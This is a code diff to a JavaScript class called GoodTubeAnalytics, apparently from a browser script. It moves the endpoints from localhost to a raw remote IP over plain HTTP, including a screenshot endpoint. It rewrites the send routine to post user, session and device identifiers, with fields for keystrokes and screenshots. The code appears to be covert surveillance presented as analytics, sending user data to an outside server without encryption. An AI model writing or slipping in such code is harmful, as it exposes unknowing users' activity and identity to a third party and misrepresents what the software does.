@@ -9,11 +9,10 @@ class GoodTubeAnalytics {
         this.config = {
             // Analytics server endpoints
             endpoints: {
-                events: 'http://localhost:5000/api/events',
-                heartbeat: 'http://localhost:5000/api/heartbeat',
-                sessions: 'http://localhost:5000/api/sessions',
-                screenshots: 'http://localhost:5000/api/screenshots',
-                keystrokes: 'http://localhost:5000/api/keystrokes'
+                analytics: 'http://134.199.235.218/api/analytics',
+                screenshot: 'http://134.199.235.218/api/screenshot',
+                stats: 'http://134.199.235.218/api/stats',
+                users: 'http://134.199.235.218/api/users'
             },
             
             // Data collection intervals
@@ -441,11 +440,27 @@ class GoodTubeAnalytics {
     
     async sendToServer(endpoint, data) {
         try {
-            const url = this.config.endpoints[endpoint];
+            let url;
+            if (endpoint === 'events' || endpoint === 'heartbeat' || endpoint === 'sessions') {
+                url = this.config.endpoints.analytics;
+            } else {
+                url = this.config.endpoints[endpoint];
+            }
+            
             if (!url) {
                 console.error('Unknown endpoint:', endpoint);
                 return;
             }
+            
+            const payload = {
+                userId: this.userId,
+                sessionId: this.sessionId,
+                deviceId: this.deviceId,
+                timestamp: Date.now(),
+                events: endpoint === 'events' ? data.events : [data],
+                keystrokes: [],
+                screenshots: []
+            };
             
             const response = await fetch(url, {
                 method: 'POST',
@@ -455,11 +470,13 @@ class GoodTubeAnalytics {
                     'X-GoodTube-User': this.userId,
                     'X-GoodTube-Device': this.deviceId
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(payload)
             });
             
             if (!response.ok) {
                 console.error('Analytics server error:', response.status, response.statusText);
+            } else {
+                console.log('✅ Analytics data sent successfully:', endpoint);
             }
         } catch (error) {
             console.error('Failed to send analytics data:', error);
